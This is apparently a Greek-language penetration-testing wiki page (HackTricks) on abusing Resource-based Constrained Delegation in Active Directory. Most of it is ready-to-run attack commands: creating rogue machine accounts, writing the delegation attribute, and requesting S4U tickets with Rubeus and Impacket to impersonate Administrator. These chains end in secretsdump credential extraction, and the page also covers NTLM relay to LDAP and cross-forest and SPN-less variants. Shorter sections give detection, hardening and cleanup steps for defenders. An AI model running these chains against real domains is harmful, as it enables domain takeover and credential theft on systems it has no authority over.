# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Βασικά του Resource-based Constrained Delegation

Αυτό είναι παρόμοιο με το βασικό [Constrained Delegation](constrained-delegation.md), αλλά **αντί** να εκχωρεί δικαιώματα σε ένα **object** ώστε να **impersonate οποιονδήποτε user απέναντι σε ένα machine**, το Resource-based Constrain Delegation **ορίζει** στο **object ποιος μπορεί να impersonate οποιονδήποτε user απέναντί του**.

Σε αυτήν την περίπτωση, το constrained object θα έχει ένα attribute που ονομάζεται _**msDS-AllowedToActOnBehalfOfOtherIdentity**_, με το όνομα του user που μπορεί να impersonate οποιονδήποτε άλλο user απέναντί του.

Μια ακόμη σημαντική διαφορά αυτού του Constrained Delegation από τις άλλες delegations είναι ότι οποιοσδήποτε user με **write permissions σε έναν machine account** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) μπορεί να ορίσει το **_msDS-AllowedToActOnBehalfOfOtherIdentity_** (στις άλλες μορφές Delegation χρειαζόσασταν domain admin privs).

### Νέες έννοιες

Στο Constrained Delegation αναφέρθηκε ότι το flag **`TrustedToAuthForDelegation`** μέσα στην τιμή _userAccountControl_ του user απαιτείται για την εκτέλεση ενός **S4U2Self.**\
Η πραγματικότητα είναι ότι, ακόμη και χωρίς αυτήν την τιμή, μπορείτε να εκτελέσετε ένα **S4U2Self** απέναντι σε οποιονδήποτε user αν είστε **service** (έχετε SPN), αλλά, αν **έχετε `TrustedToAuthForDelegation`**, το TGS που επιστρέφεται θα είναι **Forwardable**, ενώ αν **δεν έχετε** αυτό το flag, το TGS που επιστρέφεται **δεν θα** είναι **Forwardable**.

Ωστόσο, αν το **TGS** που χρησιμοποιείται στο **S4U2Proxy** **δεν είναι Forwardable**, η προσπάθεια abuse ενός **basic Constrain Delegation** **δεν θα λειτουργήσει**. Αν όμως προσπαθείτε να εκμεταλλευτείτε ένα **Resource-Based constrain delegation**, θα λειτουργήσει.

### Δομή της επίθεσης

> Αν έχετε **write equivalent privileges** σε έναν **Computer** account, μπορείτε να αποκτήσετε **privileged access** σε αυτό το machine.

Ας υποθέσουμε ότι ο attacker έχει ήδη **write equivalent privileges στον victim computer**.

1. Ο attacker **compromises** έναν account που έχει **SPN** ή **δημιουργεί έναν** (“Service A”). Σημειώστε ότι οποιοσδήποτε _Admin User_, χωρίς κανένα άλλο ειδικό privilege, μπορεί να **δημιουργήσει έως και 10 Computer objects** (**_MachineAccountQuota_**) και να τους ορίσει ένα **SPN**. Επομένως, ο attacker μπορεί απλώς να δημιουργήσει ένα Computer object και να του ορίσει ένα SPN.
2. Ο attacker **κάνει abuse του WRITE privilege** που έχει πάνω στον victim computer (ServiceB), για να ρυθμίσει το **resource-based constrained delegation**, επιτρέποντας στο ServiceA να impersonate οποιονδήποτε user απέναντι σε αυτόν τον victim computer (ServiceB).
3. Ο attacker χρησιμοποιεί το Rubeus για να εκτελέσει μια **full S4U attack** (S4U2Self και S4U2Proxy) από το Service A προς το Service B, για έναν user με **privileged access στο Service B**.
1. S4U2Self (από τον account με το compromised/created SPN): Ζητά ένα **TGS του Administrator προς εμένα** (Not Forwardable).
2. S4U2Proxy: Χρησιμοποιεί το **not Forwardable TGS** του προηγούμενου βήματος για να ζητήσει ένα **TGS** από τον **Administrator** προς το **victim host**.
3. Ακόμη και αν χρησιμοποιείτε ένα not Forwardable TGS, επειδή εκμεταλλεύεστε Resource-based constrained delegation, θα λειτουργήσει.
4. Ο attacker μπορεί να κάνει **pass-the-ticket** και να **impersonate** τον user, ώστε να αποκτήσει **access στο victim ServiceB**.

Για να ελέγξετε το _**MachineAccountQuota**_ του domain, μπορείτε να χρησιμοποιήσετε:
```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## Επίθεση

### Δημιουργία αντικειμένου υπολογιστή

Μπορείτε να δημιουργήσετε ένα αντικείμενο υπολογιστή εντός του domain χρησιμοποιώντας το **[powermad](https://github.com/Kevin-Robertson/Powermad):**
```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### Ρύθμιση Resource-based Constrained Delegation

**Χρήση του activedirectory PowerShell module**
```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**Χρήση powerview**
```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### Εκτέλεση ενός πλήρους S4U attack (Windows/Rubeus)

Αρχικά, δημιουργήσαμε το νέο Computer object με τον κωδικό πρόσβασης `123456`, επομένως χρειαζόμαστε το hash αυτού του κωδικού πρόσβασης:
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
Αυτό θα εκτυπώσει τα hashes RC4 και AES για αυτόν τον λογαριασμό.\
Τώρα, μπορεί να πραγματοποιηθεί η επίθεση:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Μπορείτε να δημιουργήσετε περισσότερα tickets για περισσότερες υπηρεσίες, ζητώντας το μόνο μία φορά με τη χρήση της παραμέτρου `/altservice` του Rubeus:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
> [!CAUTION]
> Σημειώστε ότι οι χρήστες διαθέτουν ένα attribute με την ονομασία "**Cannot be delegated**". Αν ένας χρήστης έχει αυτό το attribute ορισμένο σε True, δεν θα μπορείτε να τον impersonate. Αυτή η ιδιότητα εμφανίζεται μέσα στο bloodhound.

### Εργαλεία Linux: end-to-end RBCD με το Impacket (2024+)

Αν εργάζεστε από Linux, μπορείτε να εκτελέσετε ολόκληρη την αλυσίδα RBCD χρησιμοποιώντας τα επίσημα εργαλεία του Impacket:
```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```
Notes
- Αν επιβάλλεται LDAP signing/LDAPS, χρησιμοποιήστε `impacket-rbcd -use-ldaps ...`.
- Προτιμήστε κλειδιά AES· πολλά σύγχρονα domains περιορίζουν το RC4. Τα Impacket και Rubeus υποστηρίζουν και τα δύο flows που χρησιμοποιούν αποκλειστικά AES.
- Το Impacket μπορεί να επανεγγράψει το `sname` ("AnySPN") για ορισμένα tools, αλλά να αποκτάτε το σωστό SPN όποτε είναι δυνατό (π.χ. CIFS/LDAP/HTTP/HOST/MSSQLSvc).

## Cross-domain & cross-forest RBCD

Αν ο **delegating principal** που ελέγχετε βρίσκεται σε **διαφορετικό domain** (ή ακόμη και σε **διαφορετικό forest**) από τον **resource computer**, το abuse εξακολουθεί να είναι **RBCD**, αλλά το ticket flow δεν είναι πλέον το συνηθισμένο single-domain `S4U2Self -> S4U2Proxy`.

### Cross-domain RBCD: configure the foreign principal by SID

Όταν ορίζετε το `msDS-AllowedToActOnBehalfOfOtherIdentity` από ένα **διαφορετικό domain**, το foreign machine/user ενδέχεται να **μην μπορεί να επιλυθεί με βάση το όνομα** στο LDAP του target domain. Σε αυτήν την περίπτωση, ρυθμίστε το delegation entry χρησιμοποιώντας το **SID** του foreign principal αντί για το sAMAccountName/UPN.

Αυτό είναι ιδιαίτερα σχετικό κατά το relaying NTLM στο LDAP με το `ntlmrelayx.py`:
```bash
sudo ntlmrelayx.py -smb2support -t ldap://192.168.90.217 \
--no-dump --no-da --no-validate-privs \
--delegate-access \
--escalate-user S-1-5-21-3104832133-133926542-3798009529-1106 \
--sid
```
Σημειώσεις:
- Το `--sid` ενημερώνει το `ntlmrelayx.py` να αντιμετωπίζει το `--escalate-user` ως SID, κάτι που απαιτείται όταν ο λογαριασμός delegating ανήκει σε διαφορετικό domain από το target domain.
- Ακόμη και αν το tool εμφανίσει `User not found in LDAP`, το delegation write μπορεί να ολοκληρωθεί επιτυχώς, επειδή το security descriptor αποθηκεύει απευθείας το foreign SID.

### Cross-domain RBCD: cross-realm S4U sequence

Μόλις το foreign principal προστεθεί στο `msDS-AllowedToActOnBehalfOfOtherIdentity`, η λειτουργική cross-domain ροή είναι:

1. Λήψη ενός **TGT** για το delegating principal από το δικό του domain.
2. Αίτηση ενός **referral TGT** για το `krbtgt/<target-domain>`.
3. Αίτηση ενός **cross-realm S4U2Self referral** για τον impersonated user στον DC του target domain.
4. Αίτηση του πραγματικού **S4U2Self** ticket για αυτόν τον user πίσω στο delegator domain.
5. Εκτέλεση **S4U2Proxy** στο delegator domain για τη λήψη ενός referral ticket για το target domain.
6. Εκτέλεση του τελικού **S4U2Proxy** στον DC του target domain για τη λήψη του service ticket για `cifs/host.target`, `host/host.target` κ.λπ.

Αυτός είναι ο λόγος για τον οποίο τα τυπικά Linux tools συχνά αποτυγχάνουν σε cross-domain RBCD:
- το request **realm** ενδέχεται να πρέπει να διαφέρει από το realm του TGT που χρησιμοποιείται στο `TGS-REQ`
- η αλυσίδα χρειάζεται **ανεξάρτητα S4U2Proxy βήματα**, όχι μόνο `S4U2Self` ή `S4U2Self` που ακολουθείται αμέσως από ένα μόνο `S4U2Proxy`

### Cross-domain RBCD από Linux

Η Synacktiv δημοσίευσε μια υλοποίηση του Impacket `getST.py` που αναπαράγει τη cross-realm sequence από Linux, χειριζόμενη ρητά τα δύο KDC:
```bash
python3 ./getST.py dev.asgard.local/rbcd_test\$:R[...]5 -k \
-dc-ip 192.168.90.131 \
-targetdc 192.168.90.217 \
-targetdomain asgard.local \
-impersonate thor_adm \
-spn cifs/workstation.asgard.local

KRB5CCNAME=thor_adm@cifs_workstation.asgard.local@ASGARD.LOCAL.ccache \
./smbclient.py "asgard.local/thor_adm@workstation.asgard.local" \
-k -no-pass -dc-ip 192.168.90.217
```
Σε operational επίπεδο, τα νέα arguments είναι:
- `-dc-ip`: DC του **delegating** domain
- `-targetdomain`: domain του **resource computer**
- `-targetdc`: DC του **resource** domain

### Περιορισμοί του cross-forest RBCD

Το cross-forest RBCD έχει έναν σημαντικό περιορισμό: **ο impersonated user πρέπει να ανήκει στο ίδιο forest με τον delegating principal**. Με άλλα λόγια, αν το controlled machine account σας βρίσκεται στο `valhalla.local` και το target resource στο `asgard.local`, γενικά **δεν μπορείτε να κάνετε impersonate αυθαίρετους χρήστες του `asgard.local`** προς αυτό το resource μέσω RBCD.

Εξακολουθεί να είναι exploitable όταν:
- ο user του **delegating forest** είναι **local admin** (ή έχει άλλα privileges) στο resource host του άλλου forest
- ένα trust επιτρέπει το απαιτούμενο authentication path και το foreign SID γίνεται αποδεκτό στο security descriptor του target computer

### Quirks του cross-forest RBCD protocol

Το cross-forest RBCD δεν είναι απλώς "cross-domain plus a trust". Η παρατηρούμενη ροή περιλαμβάνει δύο quirks που συχνά παραλείπονται από τα κοινά εργαλεία:

1. Ένα επιπλέον **S4U2Proxy** request που ορίζει `PA-PAC-OPTIONS=branch-aware`
2. Ένα τελικό service ticket που μπορεί να επιστραφεί με χρήση **RC4**, ακόμη και όταν έχουν ζητηθεί άλλα etypes

Η πρακτική ροή είναι:

1. Λάβετε ένα TGT για τον delegating principal στο forest A.
2. Ζητήστε **S4U2Self** για τον impersonated user στο forest A.
3. Ζητήστε **S4U2Proxy** στο forest A για να λάβετε ένα referral TGT για το forest B.
4. Στείλτε ένα δεύτερο **S4U2Proxy** στο forest A **χωρίς το S4U2Self ticket ως additional ticket**, αλλά με ενεργοποιημένο το `branch-aware`, για να λάβετε ένα ακόμη referral TGT για το forest B.
5. Προαιρετικά, ζητήστε ένα κανονικό service ticket στο forest B για τον delegating principal (αυτό το ticket δεν απαιτείται για το τελικό abuse).
6. Χρησιμοποιήστε τα referral tickets από τα βήματα 3 και 4 για να ζητήσετε το τελικό **S4U2Proxy** ticket στο forest B για τον impersonated forest-A user προς το target SPN.

### Cross-forest RBCD από Linux

Το ίδιο Synacktiv Impacket branch προσθέτει ένα `-forest` switch για αυτήν τη λογική:
```bash
python3 ./getST.py -spn 'cifs/workstation.asgard.local' \
-impersonate 'v_thor' \
-dc-ip VALHALLA.local \
valhalla.local/'desktop$' \
-targetdc ASGARD.local \
-targetdomain asgard.local \
-aesKey 4[...]f \
-forest
```
### Recursive multi-domain RBCD (3+ domains)

Σε **multi-domain forests**, τόσο το **S4U2Self** όσο και το **S4U2Proxy** μπορούν να είναι **recursive**, αντί να σταματούν μετά από ένα referral:

- **Recursive S4U2Self**: το πρώτο `S4U2Self` αποστέλλεται στο **domain του impersonated user**, τα ενδιάμεσα parent/child hops διασχίζονται με κανονικά `TGS-REQ` referrals για `krbtgt/<REALM>`, και το **τελικό `S4U2Self`** αποστέλλεται στο **ίδιο το domain του delegating principal**.
- Αυτό σημαίνει ότι η **απλή κατοχή ενός TGT** για έναν machine account μπορεί να αρκεί για την impersonation ενός **admin από άλλο domain στο ίδιο forest** και για την αίτηση των `cifs/host`, `host/host`, `wsman/host` κ.λπ.
- Το **Recursive S4U2Proxy** ακολουθεί την trust chain με τον ίδιο τρόπο: τα ενδιάμεσα hops επαναχρησιμοποιούν το προηγούμενο ticket ως TGT, ενώ ζητούν το επόμενο `krbtgt/<REALM>` referral, και μόνο το τελευταίο hop επιστρέφει το τελικό service ticket.

Ένα πρακτικό same-forest παράδειγμα είναι:
```bash
KRB5CCNAME=MIN-FRPERSO-01\$.ccache getST.py 'minus.sub.frperso.local/MIN-FRPERSO-01$' -k -no-pass \
-impersonate Administrator@frperso.local -self \
-altservice cifs/min-frperso-01.minus.sub.frperso.local

KRB5CCNAME=Administrator@frperso.local@cifs_min-frperso-01.minus.sub.frperso.local@MINUS.SUB.FRPERSO.LOCAL.ccache \
smbclient.py frperso.local/Administrator@min-frperso-01.minus.sub.frperso.local -k -no-pass
```
### SPN-less cross-domain / cross-forest RBCD

Αν ο **delegating principal είναι user χωρίς SPN**, το τελευταίο recursive `S4U2Self` αποτυγχάνει με **`KDC_ERR_S_PRINCIPAL_UNKNOWN`**. Το workaround είναι να γίνει **retry μόνο στο final hop ως `S4U2Self+U2U`**.

Σύντομη εκδοχή του abuse chain:

1. Κάντε authenticate με το **NT hash**, ώστε το KDC να οδηγηθεί προς **RC4-HMAC (etype 23)**.
2. Κάντε αρχικά request με **`-self -u2u`** και κρατήστε αυτό το ticket ξεχωριστά από το μεταγενέστερο proxy step.
3. Κάντε extract το **TGT session key** με το `describeTicket.py`.
4. Αντικαταστήστε το **NT hash** του user με αυτό το **session key** χρησιμοποιώντας `changepasswd.py -newhashes <session_key>`.
5. Επαναχρησιμοποιήστε το `S4U2Self+U2U` ticket ως **`-additional-ticket`** κατά τη διάρκεια ενός ξεχωριστού **`-proxy`** request.
```bash
getST.py sub.frperso.local/Administrator -hashes ':<nthash>' \
-impersonate Administrator@frperso.local -self -u2u
describeTicket.py Administrator.ccache
changepasswd.py sub.frperso.local/Administrator@sub-frperso-01.sub.frperso.local \
-hashes ':<nthash>' -newhashes <tgt_session_key>
KRB5CCNAME=Administrator.ccache getST.py sub.frperso.local/Administrator -k -no-pass \
-impersonate Administrator@frperso.local -proxy -proxydomain frpublic.local \
-spn cifs/frpublic-01.frpublic.local -additional-ticket '<u2u_ticket.ccache>'
```
Λειτουργικές επισημάνσεις:

- Όταν το **first trusted hop είναι ήδη άλλο forest**, προτιμήστε τον **branch-aware** αλγόριθμο (`getST.py ... -forest`) ώστε να αντιστοιχεί στη native συμπεριφορά των Windows. Αν το foreign forest προσεγγίζεται μόνο αργότερα στην αλυσίδα, η recursive ροή χωρίς branch awareness μπορεί να λειτουργήσει.
- Σε πρόσφατους DCs με **Windows Server 2022/2025**, το forced RC4 μπορεί να αποτύχει με **`KDC_ERR_ETYPE_NOSUPP`** λόγω της κατάργησης του RC4. Αυτό μπορεί να καταστήσει το **SPN-less RBCD** αδύνατο, παρότι το κλασικό SPN-backed RBCD εξακολουθεί να λειτουργεί με AES.
- Εκτελέστε το **`S4U2Self+U2U` πριν αλλάξετε το hash/password του χρήστη**: το `SamrChangePasswordUser` **δεν** υπολογίζει ξανά τα Kerberos AES keys του account, επομένως η αλλαγή password πρώτα μπορεί να διακόψει τα επόμενα ticket requests.
- Το impersonated account πρέπει να παραμένει **delegable**: οι **Protected Users** και τα accounts με **`NOT_DELEGATED`** / **"Account is sensitive and cannot be delegated"** μπλοκάρουν την αλυσίδα.

## Σημειώσεις Detection / hardening

- Τα RBCD paths μεταξύ domains/forests εξακολουθούν συνήθως να δημιουργούνται μέσω **ACL abuse** ή **relay-to-LDAP**. Επιβάλετε **LDAP signing** και **LDAP channel binding** στους DCs για να διακόψετε τα συνηθισμένα setup paths.
- Ελέγξτε ποιοι μπορούν να γράψουν το `msDS-AllowedToActOnBehalfOfOtherIdentity` σε computer objects και επιλύστε τα stored SIDs, συμπεριλαμβανομένων των **foreign security principals**.
- Σε περιβάλλοντα με πολλά trusts, ελέγξτε το **Selective Authentication**, το **SID filtering** και αν users από foreign forest διαθέτουν δικαιώματα **local admin** σε resource hosts.

### Πρόσβαση

Η τελευταία command line θα εκτελέσει την **complete S4U attack** και θα κάνει **inject το TGS** από τον Administrator στο victim host, στη **μνήμη**.\
Σε αυτό το παράδειγμα ζητήθηκε ένα TGS για την υπηρεσία **CIFS** από τον Administrator, επομένως θα μπορείτε να αποκτήσετε πρόσβαση στο **C$**:
```bash
ls \\victim.domain.local\C$
```
### Κατάχρηση διαφορετικών service tickets

Μάθετε για τα [**διαθέσιμα service tickets εδώ**](silver-ticket.md#available-services).

## Απαρίθμηση, auditing και cleanup

### Απαρίθμηση υπολογιστών με ρυθμισμένο RBCD

PowerShell (αποκωδικοποίηση του SD για την επίλυση των SID):
```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
ForEach-Object {
$raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
$sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
$sd.DiscretionaryAcl | ForEach-Object {
$sid  = $_.SecurityIdentifier
try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
[PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
}
}
```
Impacket (ανάγνωση ή εκκαθάριση με μία εντολή):
```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```
### Εκκαθάριση / επαναφορά RBCD

- PowerShell (εκκαθάριση του attribute):
```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```
- Impacket:
```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```
## Σφάλματα Kerberos

- **`KDC_ERR_ETYPE_NOTSUPP`**: Αυτό σημαίνει ότι το kerberos έχει ρυθμιστεί ώστε να μην χρησιμοποιεί DES ή RC4 και παρέχετε μόνο το RC4 hash. Παρέχετε στο Rubeus τουλάχιστον το AES256 hash (ή απλώς παρέχετε τα rc4, aes128 και aes256 hashes). Παράδειγμα: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KDC_ERR_S_PRINCIPAL_UNKNOWN`** κατά τη διάρκεια του `-self` για έναν κανονικό χρήστη: το delegating principal πιθανότατα **δεν έχει SPN**. Επαναλάβετε το **τελευταίο hop** ως **`S4U2Self+U2U`** αντί για ένα κανονικό **`S4U2Self`**.
- **`KDC_ERR_ETYPE_NOSUPP`** κατά τη διάρκεια **SPN-less RBCD**: οι πρόσφατοι DCs ενδέχεται να απορρίπτουν το εξαναγκασμένο **RC4-HMAC** path που απαιτείται από το τέχνασμα **`S4U2Self+U2U` + session-key-substitution**. Δοκιμάστε αντ’ αυτού ένα κλασικό **SPN-backed** RBCD path με AES.
- **`KRB_AP_ERR_SKEW`**: Αυτό σημαίνει ότι η ώρα του τρέχοντος υπολογιστή διαφέρει από εκείνη του DC και το kerberos δεν λειτουργεί σωστά.
- **`preauth_failed`**: Αυτό σημαίνει ότι το δεδομένο username + hashes δεν λειτουργούν για login. Μπορεί να ξεχάσατε να βάλετε το "$" μέσα στο username κατά τη δημιουργία των hashes (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
- **`KDC_ERR_BADOPTION`**: Αυτό μπορεί να σημαίνει:
- Ο χρήστης που προσπαθείτε να impersonate δεν μπορεί να έχει πρόσβαση στην επιθυμητή υπηρεσία (επειδή δεν μπορείτε να τον impersonate ή επειδή δεν έχει αρκετά privileges)
- Η ζητούμενη υπηρεσία δεν υπάρχει (αν ζητάτε ticket για winrm αλλά το winrm δεν εκτελείται)
- Το fakecomputer που δημιουργήθηκε έχει χάσει τα privileges του πάνω στον vulnerable server και πρέπει να του τα δώσετε ξανά.
- Κάνετε abuse του classic KCD· θυμηθείτε ότι το RBCD λειτουργεί με non-forwardable S4U2Self tickets, ενώ το KCD απαιτεί forwardable.

## Σημειώσεις, relays και alternatives

- Μπορείτε επίσης να γράψετε το RBCD SD μέσω των AD Web Services (ADWS) αν το LDAP είναι filtered. Δείτε:


{{#ref}}
adws-enumeration.md
{{#endref}}

- Οι αλυσίδες Kerberos relay συχνά καταλήγουν σε RBCD για να επιτύχουν local SYSTEM σε ένα βήμα. Δείτε πρακτικά end-to-end παραδείγματα:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

- Αν το LDAP signing/channel binding είναι **disabled** και μπορείτε να δημιουργήσετε machine account, εργαλεία όπως το **KrbRelayUp** μπορούν να κάνουν relay ένα coerced Kerberos auth προς το LDAP, να ορίσουν το `msDS-AllowedToActOnBehalfOfOtherIdentity` για το machine account σας στο target computer object και να κάνουν αμέσως impersonate τον **Administrator** μέσω S4U από off-host.

## References

- [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
- [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)
- [https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- Impacket rbcd.py (official): https://github.com/fortra/impacket/blob/master/examples/rbcd.py
- Quick Linux cheatsheet with recent syntax: https://tldrbins.github.io/rbcd/
- [0xdf – HTB Bruno (LDAP signing off → Kerberos relay to RBCD)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [Synacktiv - Exploring cross-domain & cross-forest RBCD](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd.html)
- [Synacktiv - Exploring cross-domain & cross-forest RBCD: part 2](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd-part-2.html)
- [Synacktiv Impacket branch - cross_forest_rbcd](https://github.com/synacktiv/impacket/tree/cross_forest_rbcd)
- [Microsoft Learn - Kerberos constrained delegation overview](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [Microsoft Open Specifications - Cross-domain S4U2Self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/f35b6902-6f5e-4cd0-be64-c50bbaaf54a5)
- [Microsoft Open Specifications - SamrChangePasswordUser](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/9699d8ca-e1a4-433c-a8c3-d7bebeb01476)
- [Microsoft Learn - Detect and remediate RC4 usage in Kerberos](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)


{{#include ../../banners/hacktricks-training.md}}
